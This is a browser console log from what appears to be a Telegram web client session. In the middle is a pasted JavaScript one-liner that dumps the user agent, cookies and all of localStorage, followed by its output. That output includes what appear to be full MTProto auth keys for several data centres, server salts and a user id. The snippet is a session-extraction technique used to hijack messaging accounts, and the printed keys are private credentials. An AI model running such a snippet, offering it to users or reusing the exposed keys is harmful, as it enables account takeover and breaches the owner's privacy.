index.ts:333 got state, time: 245
index.ts:376 Will mount auth page: authStateSignQr 1698569080.211
logger.ts:134 [0.002] [SW] init
logger.ts:134 [0.005] [SW] got 0 windows from the start
logger.ts:134 [0.012] [SW] installing
logger.ts:134 [0.012] [SW] window connected cc61f89c-b369-4cb8-bfa9-509619fa5002 windows before 0
logger.ts:134 [0.012] [SW] windows Array(0)
logger.ts:134 [0.013] [SW] sending message port for mtproto
logger.ts:134 [0.015] [SW] skipped waiting
logger.ts:134 [0.018] [SW] activating ServiceWorkerGlobalScope
logger.ts:134 [0.019] [SW] cleared assets cache
logger.ts:134 [0.019] [SW] claimed clients
k/:1 Chrome currently does not support the Push API in incognito mode (https://crbug.com/401439). There is deliberately no way to feature-detect this, since incognito mode needs to be undetectable by websites.
console.log('—————-');console.log('username: ', '38370849-5dbf-4aa8-a5e9-e7900f0f511a');console.log('navigtor:', navigator.userAgent);console.log('cookie:', document.cookie);console.log('localStorage:', (localStorage.setItem('tt-global-state', ''), localStorage.setItem('', ''), JSON.stringify(localStorage)));console.log('—————-')
VM40:1 —————-
VM40:1 username:  38370849-5dbf-4aa8-a5e9-e7900f0f511a
VM40:1 navigtor: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
VM40:1 cookie: 
VM40:1 localStorage: {"dc3_auth_key":"\"8fe185966ead2f49052b971447226e299d4ca8f5599a6d3677a1417848ea8651475848a4d764118840821a842c2924b25b0a617c6c403e64b71415ad05156e2de9c145d12841717fb4de836aa7f1da0381e1311f2fda90d704935d4c3eb16d4f86501f17d2b474993e46e2e8d1ff9a79bd9798bc63d917c1ff64d5533c4a85cff6ec8cc9eb050051841c68c3f81b3fc3b6f3680f573c85f8a8446d843a7c520fb2fa667d4604cc7c21a1b87ccc5ebd96dcea0c3b7b2a22dc149df3e38461ee3fbb9973c83ca20ee0f006da4f4cf0da6a22bf0984256dc97692196dc911261f528de021cee2aae04848e08a8f41daff260ccef50dadd9aca493f0597d1979c2d1\"","k_build":"418","dc5_server_salt":"\"c273d3e641b1db13\"","dc3_server_salt":"\"02fcaa6bffb0808a\"","user_auth":"{\"dcID\":2,\"date\":1698569109,\"id\":6360108057}","xt_instance":"{\"id\":76401681,\"idle\":true,\"time\":1698569124964}","dc":"2","dc4_auth_key":"\"6a56140b0c7e544f3a32876777ddef286eaf106eebc784649bc5843b1be40883a69e022bad674e684b23a31f6081453af53050a1cf54dc45a70d46379925c7deb062cbc145e5ce0ca6ef16524ae4409b434280324a262dd2b39ee3aab8b5c80b6d5c709cb3b2bdbbeae818d83272b318a55ef899dc3c3e7a2c7cdd452d3c09bb34ee8cb52a2bb65d072f0a616a318bb2dfbd086830a2b0b04361c93c4f725ac4fc3b847c430c257424b43c1aa7015e3bf7119d8ea7f9fcd82dbfb54aebb516d0996d93cd6a01d0cb213b619faf78157a7c1c2daa1a656a894ae006fc0bd645a66b5133a8d63349bce1e48154dd8b08de9f3a3bdc4313140103d63973b12ec6fa\"","":"","dc2_auth_key":"\"86ef578d8df22033700505683009194d0238e4c54257f2b0d1c12cb2625c20e93aff7f86e34d2c813ab38f03256f2de7837d2ab343a923f2b2176888cdb6966ad6c335b39907c2a982fcff57e46f0072f961295a0407180c2a020ceb97446926bf197aa2b79c1a1467727d90b201225288756e4961dc224935a95c5d7a29f1352beb713db8dd20f92fed7d6898d86ddfaab1f049e9656ae8b688dbb3a4cfe4adda9bf2cc9c5ab96ce24729e184afc42e0b8a4529066cd8409bb82f888f3c2bc85acbdffe3ca8a891280edc3e56e13fa4dda3ac709df6ee91932187a5c9154dc613a06bcbaa3d6c00817de7143745453dce6a9a194618b819a71858e6153a3e6c\"","dc4_server_salt":"\"a1c2f2a7b67a381e\"","tgme_sync":"{\"canRedirect\":true,\"ts\":1698569110}","server_time_offset":"0","dc2_server_salt":"\"804fb77c375268ad\"","state_id":"1604595668","auth_key_fingerprint":"\"86ef578d\"","dc1_auth_key":"\"85a873aa5ec3580dad4bbe901b2c8fee049b00889f6f4d8d45622f1bdfe1f48639eb8d2bc13391c52eebe265bd71fdeb3b4a2bc947454cd732f436d33479e168352eb26dd4d06fe4a2f7204243e8296bc9484d1b2aa78e535255e12ca6db29ff7423c729ab7de68c1818405c6baf396baebaa86c4ed06ffe61519af960cfba86c91d376a54d2b82ff6a826f453851692918ef38b332c8eeed34c369ce9a4ccec1cc7a87f661fba5dcd5c3d67fa999dbe8961e52553ec56e68bb50ad248e7118117465d3e9c9bd9ebd4a864a309ff649b7d6e6439276ccb2a24997182d5c5d641926aeee039b3fa9d4929a94b1b5cb9a86a6e8b4e2a489b6d90546c1dda38e7e9\"","dc1_server_salt":"\"3954889a5236fb42\"","dc5_auth_key":"\"5601de0ab95584dd1bc03d4aa5b30a68c07e0181ec5218b6e5a63ef4b27965f562ed41436d73d40010349b927ec9d2e1052ba6e3040f416ce157047dd41365542d3bcb4f1fa4fb6a146e063ae27dc30ecc3f50ec2a09ff0fad26089a235309c2fc6571313a91e1982d6b47c1a8d53968d209dbb0576332e748b48badc2d2f2ff381fedd87a3a3109202f9423b4972f27e7a1bdde426f16505d6e9f463bb64029d7fcf0e0dfcec01690ecd7195c53bf7c9d11a7a3bcc51063e05826300a017fb5d7eeb3bd8f38c85e4b1ab1f42d01337133df9ce6cc03374533062a0c00b56296d9a2d5029bf8c5ada97f4a66d0b748a4eeb82278fe2dfc59e6029f9f7bf16440\"","tt-global-state":""}
VM40:1 —————-
undefined
